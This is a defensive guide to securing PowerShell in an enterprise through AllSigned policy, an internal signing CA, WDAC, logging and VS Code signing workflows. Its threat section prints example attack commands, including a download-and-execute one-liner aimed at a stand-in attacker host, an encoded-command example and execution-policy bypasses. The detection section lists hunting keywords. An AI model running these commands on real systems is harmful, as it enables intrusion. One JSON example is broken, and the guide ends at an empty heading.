
# **Fortifying the Enterprise: A Definitive Guide to PowerShell Security Through Code Signing and Application Control**

## **Section 1: The PowerShell Threat Landscape: From Safety Feature to Attack Vector**

The strategic importance of Microsoft PowerShell in modern Windows administration cannot be overstated. It is a powerful, native automation engine that provides unparalleled access to the operating system's core functions.1 However, this same power makes it a prime target for malicious actors. A foundational misunderstanding of PowerShell's built-in controls, particularly its Execution Policy, has transformed what was intended as a simple safety mechanism into a primary enabler for sophisticated cyberattacks. To build an effective defense, one must first dismantle the false sense of security surrounding this feature and understand the specific techniques adversaries employ to exploit it.

### **1.1 Deconstructing the ExecutionPolicy Bypass: The Attacker's Gateway**

The most common point of failure in securing PowerShell environments stems from a misinterpretation of the Execution Policy's purpose. It is not a security boundary designed to stop a determined adversary; rather, it is a safety feature intended to prevent users from unintentionally executing scripts they did not mean to run.2 The policy acts as a guardrail, not a locked door. This distinction is critical because attackers operate with intent, and the policy provides numerous, officially documented methods for circumvention.

The most prevalent of these methods is the use of the \-ExecutionPolicy Bypass command-line argument.5 This command, powershell.exe \-ExecutionPolicy Bypass \-File malicious\_script.ps1, instructs the PowerShell engine to ignore the currently configured policy for that specific process. While this has legitimate use cases, such as running scripts embedded within larger, self-contained applications, it has become the de facto standard for malicious script execution.6 Its presence in command-line logs is a high-fidelity indicator of potentially malicious activity and is a primary focus for detection rules within Security Information and Event Management (SIEM) and Endpoint Detection and Response (EDR) platforms.6

The widespread abuse of this technique is formally recognized within the MITRE ATT\&CK framework as sub-technique T1059.001 (PowerShell), falling under the "Execution" tactic. The extensive list of threat actor groups associated with this technique—including state-sponsored actors like APT28, APT29, and Volt Typhoon, as well as numerous ransomware and cybercrime groups—highlights its universal effectiveness and prevalence in the modern threat landscape.6 The very existence and commonality of this bypass demonstrate that any security strategy relying solely on the Execution Policy is fundamentally flawed. The widespread misunderstanding of the policy's function is not merely a knowledge gap; it represents an exploitable vulnerability in administrative and security practices. Attackers rely on the fact that many organizations set a restrictive policy and assume the environment is secure, thereby neglecting the more robust controls necessary for a true defense-in-depth posture.

### **1.2 A Taxonomy of Malicious PowerShell Techniques**

Adversaries favor PowerShell for a simple reason: it allows them to "live off the land" (LOTL). By leveraging a tool that is a legitimate, trusted, and digitally signed component of the Windows operating system, attackers can blend their activities with normal administrative traffic, effectively bypassing traditional security solutions like signature-based antivirus and many application whitelisting products that inherently trust powershell.exe.1

Fileless Malware Execution  
A key advantage of PowerShell for attackers is its ability to execute code directly in memory, leaving no files on the disk that could be scanned or analyzed forensically. This "zero-footprint" or "fileless" attack methodology is a hallmark of modern malware campaigns.1 A common technique involves downloading and executing a remote script in a single, non-interactive command line, making it ideal for initial payloads delivered via phishing emails or malicious documents.5 The command often looks like this:  
powershell.exe \-c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"  
This command uses the Invoke-Expression cmdlet (alias IEX) to execute the content of a script fetched directly from a web server, without ever writing the .ps1 file to the local disk.13  
Obfuscation and Encoding  
To evade simple command-line logging and keyword-based detection, attackers frequently obfuscate their payloads. The \-EncodedCommand switch is a built-in feature of PowerShell that accepts a Base64-encoded string.9 This allows an attacker to conceal the entire script within an otherwise unintelligible block of text, bypassing security tools that are not configured to decode and inspect these commands.11 For example, the simple command Write-Host 'pwnd' can be encoded and executed as:  
powershell.exe \-EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAcAB3AG4AZAAhACcA  
Only advanced logging capabilities, such as Script Block Logging, can reliably capture the de-obfuscated version of these commands as they are processed by the PowerShell engine.14  
Alternative Bypass Methods  
The \-ExecutionPolicy Bypass flag is just one of many ways to circumvent the policy. A comprehensive defense must account for the full range of techniques, including:

* Piping Script Content: The content of a script can be read using Get-Content (or the command prompt's type command) and piped directly into the PowerShell executable, which executes it from standard input, a context where the Execution Policy does not apply.5  
  Get-Content.\\\\malicious\_script.ps1 | powershell.exe \-noprofile \-  
* **Interactive Console:** The Execution Policy only applies to the running of script files (.ps1). It does not prevent a user from opening an interactive PowerShell console and pasting the contents of a script directly into the terminal for execution.5  
* **Registry Modification:** An attacker with sufficient privileges can directly modify the registry keys where the Execution Policy settings are stored, changing the policy for the machine or user to a more permissive setting like Bypass or Unrestricted.5

### **1.3 The Execution Policy's True Purpose: A Safety Net, Not a Steel Wall**

To properly defend against PowerShell attacks, it is essential to use the Execution Policy as it was intended. It serves as a valuable first-line defense against accidental script execution by novice users, but it should never be considered a robust security control.17 The various policy levels offer different degrees of this "safety net" functionality 2:

* **Restricted:** The default on Windows client operating systems. It permits individual commands but does not allow any script files to run.  
* **AllSigned:** Requires that all scripts and configuration files be digitally signed by a trusted publisher. This is the most secure operational policy.  
* **RemoteSigned:** The default on Windows Server. It allows local, unsigned scripts to run but requires scripts downloaded from the internet to be signed by a trusted publisher.  
* **Unrestricted:** Allows all scripts to run. For scripts downloaded from the internet, it will prompt the user for confirmation before running.  
* **Bypass:** Nothing is blocked, and no warnings or prompts are issued.  
* **Undefined:** No policy is set in the current scope. If all scopes are Undefined, the effective policy becomes Restricted.

The best analogy for the Execution Policy is the "Are you sure you want to run this file?" security warning in Windows. It provides a moment of pause for a user who might be about to do something inadvertently dangerous. It is a speedbump, not a barricade. A determined attacker, like a driver who intentionally ignores a speedbump, will bypass it without a second thought.3 Therefore, the foundation of a secure PowerShell strategy is to move beyond this safety feature and implement true security boundaries.

## **Section 2: Foundational Hardening: Enforcing the AllSigned Execution Policy**

After acknowledging the limitations of the Execution Policy as a security boundary, the first practical step in building a robust defense is to leverage it for its most powerful capability: enforcing a mandatory code signing requirement. By setting the policy to AllSigned across the enterprise, the security paradigm shifts from a weak preventative measure to a strong, auditable control that enforces script integrity and authenticity. This must be implemented using a centralized management tool like Group Policy to ensure it is consistently applied and cannot be overridden by local users.

### **2.1 Strategic Rationale for AllSigned**

Adopting the AllSigned execution policy fundamentally alters the trust model for script execution within an organization. Instead of a default-allow posture that attempts to block certain scenarios (like running unsigned remote scripts), it establishes a positive security model where scripts must proactively prove their trustworthiness before they are allowed to run.2 This policy enforces two critical security principles:

1. **Integrity:** A valid digital signature guarantees that the script has not been altered or tampered with since the moment it was signed. This directly mitigates the risk of an attacker gaining access to a network file share and maliciously modifying a legitimate, trusted administrative script.7  
2. **Authenticity:** The signature cryptographically links the script to a specific publisher (e.g., your organization's internal Certificate Authority). This provides a clear, auditable chain of provenance, ensuring that only scripts originating from an approved source can be executed.

Implementing this policy is not merely a technical configuration; it is a strategic decision that acts as an organizational forcing function. Upon deployment, all existing unsigned scripts across the enterprise—including legitimate logon scripts, administrative tools, and developer utilities—will cease to function. This "breaking change" compels the organization to abandon ad-hoc scripting practices and adopt a managed, secure software development lifecycle for its internal automation. It necessitates the creation of a formal code signing process, the establishment of a trusted Certificate Authority, and the education of all personnel who write and deploy scripts. This single policy change, therefore, becomes a catalyst for improving change control, accountability, and the overall security maturity of the organization.

### **2.2 Implementation via Group Policy**

For enterprise-wide enforcement, the AllSigned policy must be deployed via Group Policy. This is the only method that ensures the setting cannot be bypassed by users with local administrative privileges, who could otherwise use the Set-ExecutionPolicy cmdlet to change the local policy settings.18

The configuration is performed through the Group Policy Management Console (GPMC). The following steps detail the process:

1. Create a new Group Policy Object (GPO) or edit an existing one that is linked to the Organizational Units (OUs) containing the target computer objects.  
2. Navigate to the following path in the Group Policy Management Editor:  
   Computer Configuration \> Policies \> Administrative Templates \> Windows Components \> Windows PowerShell  
3. Locate and open the **"Turn on Script Execution"** policy setting.21  
4. Set the policy to **Enabled**.  
5. From the "Execution Policy" dropdown menu, select **"Allow only signed scripts"**. This setting corresponds to the AllSigned execution policy.21  
6. Click OK to save the policy. Once the GPO replicates and client machines refresh their policy, this setting will take effect.

### **2.3 Mastering Scope and Precedence**

Understanding how PowerShell applies execution policies from different sources is crucial for effective enforcement. PowerShell evaluates policies in a strict order of precedence, with settings applied via Group Policy taking ultimate authority.17 The hierarchy is as follows:

1. **MachinePolicy:** Applied to all users of a computer. This is the scope set by the Group Policy path under Computer Configuration. It has the highest precedence and cannot be overridden.  
2. **UserPolicy:** Applied to the current user. This is the scope set by the Group Policy path under User Configuration.  
3. **Process:** Affects only the current PowerShell session (powershell.exe). This scope is set using the \-ExecutionPolicy command-line parameter or by modifying an environment variable and is lost when the session is closed.  
4. **LocalMachine:** Affects all users on the computer and is set by a local administrator using Set-ExecutionPolicy \-Scope LocalMachine. This setting is stored in the registry but is overridden by MachinePolicy or UserPolicy from GPO.  
5. **CurrentUser:** Affects only the current user and is set using Set-ExecutionPolicy \-Scope CurrentUser. It is also overridden by any GPO policies.

This hierarchy is precisely why implementing the policy via Group Policy under Computer Configuration is the only reliable method for enterprise security. It establishes a non-negotiable baseline (MachinePolicy) that prevents both standard users and local administrators from weakening the security posture of the machine.2

## **Section 3: Building the Root of Trust: Establishing an Internal Code Signing Infrastructure**

With an enterprise-wide AllSigned policy enforced, the next logical and necessary step is to create the infrastructure that allows for the creation of trusted digital signatures. For most organizations, purchasing publicly trusted code signing certificates for internal scripts is both cost-prohibitive and operationally cumbersome. The optimal solution is to establish an internal Public Key Infrastructure (PKI) using Active Directory Certificate Services (AD CS). This provides a centralized, manageable, and cost-effective way to issue code signing certificates that are automatically trusted by all domain-joined computers.

### **3.1 Architecting an Enterprise Certificate Authority (CA)**

The foundation of an internal signing solution is a Certificate Authority. The Active Directory Certificate Services (AD CS) role, available on Windows Server, is the standard for creating an enterprise CA that is tightly integrated with Active Directory Domain Services (AD DS).22 When a CA is integrated with AD, domain-joined clients automatically trust its root certificate, which simplifies the distribution of trust anchors. While a full PKI design is beyond the scope of this report, the core requirement is an operational Enterprise CA from which a code signing certificate template can be configured and published.

### **3.2 Step-by-Step: Creating and Configuring the Code Signing Certificate Template**

Once the AD CS role is installed, administrators must create a specific certificate template that defines the properties of the code signing certificates to be issued. This ensures that only authorized users can request certificates and that the certificates are configured correctly for their intended purpose.

The following steps are based on the process detailed in Microsoft's documentation for creating a custom code signing certificate 24:

1. On the server running AD CS, open the **Certification Authority** management console.  
2. Right-click on **Certificate Templates** and select **Manage**. This will open the Certificate Templates Console.  
3. In the list of templates, find the default **Code Signing** template, right-click it, and select **Duplicate Template**.  
4. In the new template's properties, configure the following tabs:  
   * **Compatibility:** Set the "Certification Authority" to a modern version (e.g., Windows Server 2012 or newer) and the "Certificate recipient" to a modern client (e.g., Windows 8 / Windows Server 2012\) to enable stronger cryptographic algorithms.  
   * **General:** Provide a clear and descriptive **Template display name**, such as "Enterprise PowerShell Signing Certificate". This is the name administrators and users will see when requesting a certificate.  
   * **Request Handling:** Check the box for **"Allow private key to be exported"**. This is a critical setting for scenarios where scripts need to be signed on different machines or within automated build systems where the certificate must be transportable (e.g., as a .pfx file).  
   * **Subject Name:** Select the **"Supply in the request"** radio button. This allows the person requesting the certificate to specify details like the common name, which is useful for identifying the signer.  
   * **Security:** This is the most important control. Add the Active Directory security group that should be allowed to request these certificates (e.g., "PowerShell Developers" or "DevOps Team"). Grant this group **Read** and **Enroll** permissions. Remove enroll permissions from other groups as necessary.  
5. Click **OK** to save the new template.  
6. Back in the Certification Authority console, right-click **Certificate Templates**, navigate to **New**, and select **Certificate Template to Issue**.  
7. Select the newly created "Enterprise PowerShell Signing Certificate" template from the list and click **OK**. The template is now published and available for enrollment.

### **3.3 Certificate Distribution: Deploying the Trust Anchor**

A script signed with a certificate from the new internal CA will fail validation on a client machine unless that machine trusts the CA itself. This trust is established by distributing the CA's public root certificate to all computers in the domain. Furthermore, to ensure a seamless user experience without security prompts, the root certificate must be placed in two specific certificate stores on each client machine.

This dual-pronged trust deployment is most efficiently managed via Group Policy. The process involves two distinct but related trust checks performed by PowerShell 25:

1. **Authenticode Trust (Trusted Root Certification Authorities):** This is the standard cryptographic check. Windows verifies that the certificate used to sign the script chains up to a root certificate located in the Trusted Root Certification Authorities store. This confirms the signature is mathematically valid.  
2. **Publisher Trust (Trusted Publishers):** This is an additional check specific to PowerShell's security model. After confirming the signature is valid, PowerShell checks if the signing certificate (or its issuing CA) is present in the Trusted Publishers store. If it is not, PowerShell will still prompt the user with a security warning: "Do you want to run software from this untrusted publisher?".23 This prompt disrupts automation and can confuse users.

To prevent these prompts and establish complete trust, a GPO must be configured to distribute the root CA certificate to both stores:

1. Export the public root certificate from your Enterprise CA. This should be a .cer file that does not contain the private key.  
2. Create a new GPO or edit an existing one linked to the relevant computer OUs.  
3. Navigate to Computer Configuration \> Policies \> Windows Settings \> Security Settings \> Public Key Policies.  
4. Right-click on **Trusted Root Certification Authorities** and select **Import...**. Follow the wizard to import the .cer file of your root CA.27  
5. Repeat the process for the **Trusted Publishers** store. Right-click on **Trusted Publishers** and select **Import...**, importing the same root CA .cer file.23

By deploying the root certificate to both stores, domain-joined machines will not only validate the cryptographic integrity of signed scripts but will also inherently trust the publisher, allowing scripts to run without any user intervention or security warnings. This is a crucial step for achieving seamless and secure automation.

## **Section 4: The Mechanics of Integrity: A Practical Guide to Signing Scripts and Executables**

With the AllSigned policy enforced and the internal PKI infrastructure established, the next phase involves the practical application of digital signatures to scripts and executables. This section provides the specific commands and procedures for developers and administrators to sign their code, ensuring it complies with the new security policy. The process differs slightly for PowerShell scripts versus executable files, but the core principles of integrity, authenticity, and timestamping remain constant.

### **4.1 Signing PowerShell Scripts with Set-AuthenticodeSignature**

PowerShell provides a native cmdlet, Set-AuthenticodeSignature, for applying digital signatures to script files (.ps1, .psm1, etc.).29 Before this command can be used, the user performing the signing must have successfully enrolled for and installed a code signing certificate from the internal CA, which should now be available in their personal certificate store.

The signing process is straightforward and can be accomplished with a few lines of PowerShell code 26:

PowerShell

\# Step 1: Retrieve the code signing certificate from the current user's personal certificate store.  
\# The \-CodeSigningCert parameter filters for certificates that are valid for code signing.  
\# 'Select-Object \-First 1' is used to grab the first available certificate if multiple exist.  
$certificate \= Get-ChildItem \-Path Cert:\\CurrentUser\\My \-CodeSigningCert | Select-Object \-First 1

\# Check if a certificate was found before proceeding.  
if ($certificate) {  
    \# Step 2: Define the path to the script that needs to be signed.  
    $scriptPath \= "C:\\Scripts\\Deploy-Application.ps1"

    \# Step 3: Apply the Authenticode signature to the script file.  
    Set-AuthenticodeSignature \-FilePath $scriptPath \-Certificate $certificate  
    Write-Host "Successfully signed $scriptPath"  
}  
else {  
    Write-Error "No code signing certificate found in the current user's personal store."  
}

After signing, the signature can be verified in two ways:

* Using PowerShell: The Get-AuthenticodeSignature cmdlet can be used to inspect the signature status of a file. A valid signature will return a status of Valid.  
  Get-AuthenticodeSignature \-FilePath C:\\Scripts\\Deploy-Application.ps1  
* **Using Windows Explorer:** Right-click the script file, select **Properties**, and navigate to the **Digital Signatures** tab. The signature details, including the signer's name and timestamp, will be listed.31

### **4.2 The Importance of Timestamping**

A standard digital signature is only considered valid as long as the certificate that created it has not expired. This creates a significant operational burden, as it would require re-signing every script in the organization whenever a signing certificate is renewed, typically every one to two years.23

The solution to this problem is **timestamping**. During the signing process, a hash of the script is sent to a trusted third-party Time Stamping Authority (TSA). The TSA returns a signed timestamp, which is embedded within the overall digital signature. This cryptographically proves that the script was signed at a time when the certificate *was* valid. As a result, the signature remains valid indefinitely, even long after the original signing certificate has expired.23

To include a timestamp, the \-TimestampServer parameter is added to the Set-AuthenticodeSignature command. Many public CAs operate free timestamping services.

PowerShell

\# Command updated to include timestamping  
Set-AuthenticodeSignature \-FilePath $scriptPath \-Certificate $certificate \-TimestampServer "http://timestamp.digicert.com"

### **4.3 Signing Executable Files (.exe) with SignTool.exe**

A comprehensive code signing strategy must extend beyond PowerShell scripts to include any internally developed executable files (.exe, .dll, etc.). The standard tool for signing these files is SignTool.exe, which is included as part of the Windows Software Development Kit (SDK).32

The signing process for executables is performed via the command line. The choice of how the signing certificate's private key is accessed—whether from the user's certificate store or a password-protected .pfx file—has significant security implications. Using the certificate store is common for interactive, developer-driven signing. Using a .pfx file is necessary for automated build systems (like CI/CD pipelines), but requires extremely careful management of the file and its password. A compromised .pfx file could allow an attacker to sign malicious code that would be trusted throughout the organization. When using this method, the .pfx file and its password must be treated as highly sensitive secrets, stored in a secure vault (e.g., Azure Key Vault, HashiCorp Vault) and never hardcoded into scripts.

The following command demonstrates how to sign an executable using a .pfx file, including a timestamp 32:

DOS

REM Navigate to the directory where SignTool.exe is located  
cd "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x64"

REM Sign the executable  
signtool.exe sign /f "C:\\Certs\\CodeSigningCert.pfx" /p "pfx\_password" /tr http://timestamp.digicert.com /td SHA256 /fd SHA256 "C:\\Apps\\MyInternalApp.exe"

**Command Parameters Explained:**

* sign: Specifies the signing operation.  
* /f "C:\\Certs\\CodeSigningCert.pfx": Specifies the path to the certificate file.  
* /p "pfx\_password": Provides the password for the private key in the .pfx file.  
* /tr http://timestamp.digicert.com: Specifies the URL of the timestamp server.  
* /td SHA256: Specifies the digest algorithm for the timestamp server (should be SHA256).  
* /fd SHA256: Specifies the file digest algorithm for the signature (should be SHA256).  
* "C:\\Apps\\MyInternalApp.exe": The path to the file being signed.

Verification of the signed executable is done using the verify command with SignTool.exe:  
signtool.exe verify /pa /v "C:\\Apps\\MyInternalApp.exe"  
The /pa flag instructs SignTool to use the default Windows authentication policy for verification, and /v provides verbose output.34

## **Section 5: Advanced Defenses: Application Control and Constrained Language Mode**

Enforcing the AllSigned execution policy is a crucial foundational step, but it is not a panacea. A determined attacker who compromises a developer's machine or a build server could potentially steal a valid code signing certificate and sign their own malicious scripts. To mitigate this and other advanced threats, organizations must implement a true application whitelisting solution. In the Windows ecosystem, this means choosing between AppLocker and the more modern Windows Defender Application Control (WDAC). These technologies provide a much stronger security boundary and enable a powerful security feature known as PowerShell Constrained Language Mode.

### **5.1 Introduction to Modern Application Whitelisting**

Application control technologies move beyond simple policy checks to create a robust, enforceable list of what is allowed to execute on a system. When an application control policy is active, it fundamentally changes how PowerShell operates, creating a tiered security model that is far more resilient than a simple allow/deny list.35

The key benefit of this approach is the automatic enforcement of **PowerShell Constrained Language Mode**. When PowerShell detects that it is running under an active AppLocker or WDAC policy, it evaluates any script that is about to be executed.

* If the script is explicitly trusted by the policy (e.g., it is signed by a publisher defined in a WDAC rule), it runs in **FullLanguage** mode, with access to all of PowerShell's features.35  
* If the script is *not* explicitly trusted by the policy, it is not necessarily blocked. Instead, it is automatically demoted to run in **ConstrainedLanguage** mode.37

Constrained Language Mode is a sandboxed execution environment that severely limits PowerShell's capabilities. It disables access to sensitive features that are commonly abused by malware, such as calling arbitrary.NET and Win32 APIs, interacting with COM objects, and other advanced language elements.20 This effectively "defangs" untrusted scripts, allowing them to perform basic automation tasks but preventing them from executing the dangerous functions required for system compromise. This "fail-safe" posture—containing the risk of unknown code rather than simply blocking it—is a far more sophisticated and practical security model than the binary block/allow of the AllSigned execution policy alone.

### **5.2 Comparative Analysis: AppLocker vs. Windows Defender Application Control (WDAC)**

Choosing the right application control technology is a critical strategic decision. AppLocker, introduced with Windows 7, is a mature but legacy technology. WDAC (formerly known as Device Guard Code Integrity) is Microsoft's modern, strategic solution for application control and is considered a true security feature.35 Microsoft's official recommendation is to use WDAC for new deployments wherever possible.35 The following table provides a comparative analysis to guide this decision.

| Feature | AppLocker | Windows Defender Application Control (WDAC) | Relevant Snippets |
| :---- | :---- | :---- | :---- |
| **Primary Goal** | Application whitelisting, not a security boundary | True security feature, serviced by MSRC | 35 |
| **Scope** | Per user or per group on a machine | Entire machine, including all users | 42 |
| **Kernel Protection** | No (user-mode only) | Yes (protects against kernel-mode driver attacks) | 40 |
| **Enforcement Engine** | AppIDSvc.exe (user-mode service) | Integrated into the OS hypervisor layer (VBS) | 41 |
| **Policy Management** | Group Policy (gpedit.msc), PowerShell | PowerShell, WDAC Wizard, Intune, ConfigMgr | 45 |
| **User Experience** | Can create user-specific rules (good for shared PCs) | Applies universally; less flexible for multi-user scenarios | 42 |
| **Reboot Requirement** | Rules can often be applied without reboot | Policies, especially base policies, often require a reboot | 48 |
| **Microsoft's Recommendation** | Legacy; no new feature development | Preferred and actively developed solution | 35 |

The analysis makes the strategic path clear: WDAC is the technically superior and more secure option, offering kernel-level protection that AppLocker cannot. Its enforcement is integrated at a deeper level of the operating system, making it more resilient to tampering. While AppLocker retains a niche use case for applying different rules to different users on a shared computer, WDAC should be the default choice for securing modern enterprise endpoints.

### **5.3 Implementing WDAC for Granular PowerShell Control**

Deploying WDAC requires a careful, methodical approach to avoid disrupting business operations. The process should always begin with a policy running in **Audit Mode**, which logs potential violations without actually blocking them. This allows administrators to refine the policy based on real-world usage before switching to enforcement.

The **WDAC Policy Wizard** is the recommended tool for creating and editing policies, as it simplifies the complex XML structure into a user-friendly interface.47 A typical implementation workflow is as follows:

1. **Create a Base Policy in Audit Mode:**  
   * Launch the WDAC Policy Wizard and select "Policy Creator".43  
   * Choose the "Multiple Policy Format" and "Base Policy" options.  
   * Start with a pre-defined template, such as **"Default Windows Mode"**, which trusts all Windows components and Microsoft Store apps.52  
   * On the "Configuring Policy Rules" page, ensure that **"Audit Mode"** is enabled. This is the most critical step for a safe initial deployment.52  
   * Ensure **"User Mode Code Integrity"** is enabled to ensure the policy applies to applications and scripts, not just kernel-mode drivers.52  
2. **Add Custom Rules for Internal Code:**  
   * On the "Creating custom file rules" page, add a new **Publisher Rule**.52  
   * Create this rule based on the public root certificate (.cer file) of your internal CA (created in Section 3). This rule explicitly tells WDAC to trust any code signed by a certificate that chains up to your internal root.  
   * This is the key step that allows your internally signed PowerShell scripts to run in **FullLanguage** mode, while all other untrusted scripts will be demoted to **ConstrainedLanguage** mode.36  
3. **Deploy the Audit Policy:**  
   * The wizard will generate an XML policy file. This file must be converted to a binary format (.cip) using the ConvertFrom-CIPolicy PowerShell cmdlet.48  
   * Deploy this binary policy to a pilot group of machines. Deployment can be done via various methods, including Microsoft Intune (using a custom OMA-URI profile), Microsoft Configuration Manager, or Group Policy.48  
4. **Monitor and Refine:**  
   * Monitor the Code Integrity event logs on the pilot machines (Applications and Services Logs \> Microsoft \> Windows \> CodeIntegrity \> Operational). Look for audit events (Event ID 3077\) that indicate what would have been blocked if the policy were in enforcement mode.  
   * If legitimate, unsigned applications are being flagged, create **supplemental policies** to allow them and merge them with the base policy.  
5. **Deploy the Enforced Policy:**  
   * Once the audit logs show that the policy is correctly allowing all legitimate software, edit the base policy XML file to remove the "Audit Mode" rule option.43  
   * Re-convert the enforced policy to binary and deploy it to the organization.

This structured approach ensures that the transition to a fully enforced application control environment is smooth, predictable, and does not negatively impact user productivity.

## **Section 6: Achieving Pervasive Visibility: Detection and Forensic Logging**

A defense-in-depth security strategy is incomplete without robust visibility. Implementing controls like AllSigned and WDAC is crucial, but without comprehensive logging, an organization cannot detect attempts to bypass these controls, hunt for threats, or conduct effective incident response. Default PowerShell logging is inadequate for security purposes; enhanced logging must be enabled via Group Policy to capture the detailed forensic data needed to uncover malicious activity.14

Furthermore, a well-configured logging infrastructure is not merely a reactive tool for post-breach analysis. It is a proactive enabler for advanced security controls. The process of deploying WDAC, for instance, relies heavily on the data gathered while the policy is in Audit Mode. The audit events generated in the logs are the primary source of information administrators use to identify which legitimate applications need to be added to the policy. Without a centralized and reliable logging system, deploying WDAC effectively and safely at an enterprise scale becomes nearly impossible. Logging, therefore, is the foundational layer upon which a mature application control strategy is built.

### **6.1 The Three Pillars of PowerShell Logging**

To achieve comprehensive visibility, three distinct types of PowerShell logging must be enabled. Each provides a unique piece of the forensic puzzle.

* **Module Logging:** This records the loading of PowerShell modules (e.g., PowerSploit, Nishang) and their pipeline execution events into the event log under Event ID 4103\. This is particularly useful for identifying when an attacker is using known offensive security toolkits, as the loading of these modules serves as a strong indicator of compromise.14  
* **Script Block Logging:** This is the most critical logging feature for security. It records the content of every script block as it is executed by the PowerShell engine, logging it to Event ID 4104\. Its most powerful capability is that it logs the code *after* any de-obfuscation has occurred. This means that if an attacker uses techniques like Base64 encoding (-EncodedCommand) or string manipulation to hide their payload, Script Block Logging will record the clear, decoded script content, revealing the attacker's true intent.14  
* **Transcription:** This feature creates a complete, text-based log of an entire interactive PowerShell session for a user. It captures every command the user types and all the output that is returned to the console. This provides invaluable context during an investigation, showing the step-by-step actions an attacker took after gaining interactive access to a system.14

### **6.2 Configuration via Group Policy**

The most reliable and scalable method for enabling these logging features across an enterprise is through Group Policy. The settings are located in the following GPO path 14:  
Computer Configuration \> Policies \> Administrative Templates \> Windows Components \> Windows PowerShell  
The following policies must be configured:

1. **Turn on Module Logging:**  
   * Set the policy to **Enabled**.  
   * In the "Options" pane, click the **Show...** button next to "Module Names".  
   * In the dialog box that appears, enter a single asterisk (\*) to specify that all modules should be logged. This ensures comprehensive coverage.14  
2. **Turn on PowerShell Script Block Logging:**  
   * Set the policy to **Enabled**.  
   * There is an optional checkbox to "Log script block execution start / stop events". While this provides more granular data, it generates a very high volume of events and is not typically necessary for most environments.56  
3. **Turn on PowerShell Transcription:**  
   * Set the policy to **Enabled**.  
   * In the "Options" pane, check the **"Include invocation headers"** box to add timestamps to each command.  
   * For the **"OutputDirectory"**, specify a centralized, secure network share (e.g., \\\\logserver\\transcripts$). This is critical for collecting transcripts from all endpoints for central analysis. The share permissions should be configured to be write-only for endpoint computer accounts and read-only for security analysts to prevent tampering or unauthorized access.14

### **6.3 Integrating Logs with SIEM/EDR for Threat Hunting**

Once logging is enabled, the event data must be collected from endpoints and forwarded to a central SIEM platform (such as Splunk, Sentinel, etc.) for analysis and alerting. This can be accomplished using a SIEM agent or native Windows Event Forwarding (WEF).6

With the logs centralized, security analysts can perform threat hunting and create detection rules based on key indicators of compromise (IOCs) found in PowerShell logs:

* **Command-Line Arguments:** Search for process creation events (powershell.exe) where the command line contains suspicious strings like \-ExecutionPolicy Bypass, \-EncodedCommand, IEX, Invoke-Expression, or DownloadString.  
* **Script Block Content:** Analyze the de-obfuscated content from Event ID 4104 for malicious commands, functions, or variable names, such as Invoke-Mimikatz, Get-Keystrokes, or references to known hacking tools like PowerSploit or Cobalt Strike.1  
* **Network Connections:** Correlate PowerShell execution events with subsequent network connections to suspicious IP addresses or domains, which could indicate communication with a command-and-control (C2) server.  
* **Module Loads:** Alert on the loading of any non-standard or suspicious modules identified in the Module Logging events (Event ID 4103).

By combining enhanced logging with centralized analysis, organizations can move from a passive, preventative security posture to an active defense model capable of detecting and responding to PowerShell-based threats in near real-time.

## **Section 7: Securing the Development Pipeline: Integrating Automated Signing into VS Code**

A security policy is only effective if it is consistently followed, and compliance is highest when the secure path is also the most convenient one. Forcing developers and administrators who write PowerShell scripts to leave their primary editor, open a separate console, and manually run signing commands introduces "security friction." This friction can lead to frustration, workarounds, and a general degradation of the security posture. To make the AllSigned policy sustainable and effective, it is essential to integrate the code signing process directly into the development workflow. For the many professionals using Visual Studio Code (VS Code), this means creating a seamless, one-click, or even fully automated signing experience.

This final step is critical because it addresses the human factor. By making the signing process an invisible, frictionless part of a developer's normal routine, security becomes an enabler of productivity rather than a hindrance. This dramatically increases the likelihood of adoption and long-term success for the entire code signing initiative.

### **7.1 Configuring VS Code for a Secure PowerShell Environment**

The first step is to ensure VS Code is properly configured for PowerShell development. This requires installing the official **PowerShell extension** from Microsoft, which provides rich language support, IntelliSense, and debugging capabilities.62

Crucially, the Integrated Console within VS Code respects the system's PowerShell Execution Policy. If the AllSigned policy has been enforced via Group Policy, any attempt to run or debug an unsigned script directly within VS Code will fail.64 This reality makes an in-editor signing solution not just a convenience, but a necessity for maintaining developer productivity.

### **7.2 Method 1: Manual Signing with a Custom VS Code Task**

VS Code includes a powerful feature called Tasks, which allows for the configuration of custom scripts and commands that can be run against the current workspace. A task can be created to sign the currently active script file with a single keyboard shortcut.

To configure this, a tasks.json file must be created in the .vscode folder of the project workspace. The following configuration defines a task named "Sign Current Script" 65:

JSON

{  
    "version": "2.0.0",  
    "tasks":,  
            "presentation": {  
                "reveal": "silent",  
                "focus": false,  
                "panel": "shared",  
                "showReuseMessage": false,  
                "clear": true  
            },  
            "group": {  
                "kind": "build",  
                "isDefault": true  
            }  
        }  
    \]  
}

**Configuration Breakdown:**

* **label**: The user-friendly name of the task.  
* **type**: Set to "shell" to run a command-line command.  
* **command**: This is the core of the task. It executes powershell.exe and runs the same signing commands from Section 4\. The ${file} variable is a special VS Code variable that automatically substitutes the path of the currently open file.  
* **presentation**: These settings control how the task runs in the terminal, configured here to be silent and non-intrusive.  
* **group**: By setting this as the default "build" task, the developer can now sign their script at any time by simply pressing the default build shortcut, Ctrl+Shift+B.

### **7.3 Method 2: Automated "Sign-on-Save" Functionality**

While a manual task is a significant improvement, the ultimate goal for seamless integration is to have the script signed automatically every time it is saved. This can be achieved through two primary methods.

Using a Commercial Extension:  
The most straightforward way to enable sign-on-save is by using a commercial extension that provides this feature out of the box. PowerShell Pro Tools is a popular extension for VS Code that includes a "Sign on Save" setting. Once enabled, the user selects their code signing certificate once, and the extension automatically handles the signing process in the background every time a .ps1 file is saved.66 For organizations that can invest in developer tooling, this is the simplest and most robust solution.  
Building a Custom Solution (Advanced):  
For environments that prefer not to use commercial extensions, a similar functionality can be built using a combination of a dedicated signing script and a generic file watcher extension.

1. **Create a Reusable Signing Script:** Create a PowerShell script (e.g., Invoke-SignScript.ps1) that accepts a file path as a parameter and performs the signing and timestamping operations.  
2. **Install a File Watcher Extension:** Install a generic extension from the VS Code Marketplace, such as **"Run on Save"** or **"File Watcher"**.  
3. **Configure the Watcher:** Configure the extension's settings (settings.json) to monitor files with the .ps1 extension.  
4. **Set the Command:** Configure the "command" to be executed on save. The command will call powershell.exe to run the Invoke-SignScript.ps1 script, passing the path of the saved file as an argument.

This custom approach requires more initial setup but provides a fully automated sign-on-save workflow without the need for commercial software.

### **7.4 Best Practices for Private Key Management**

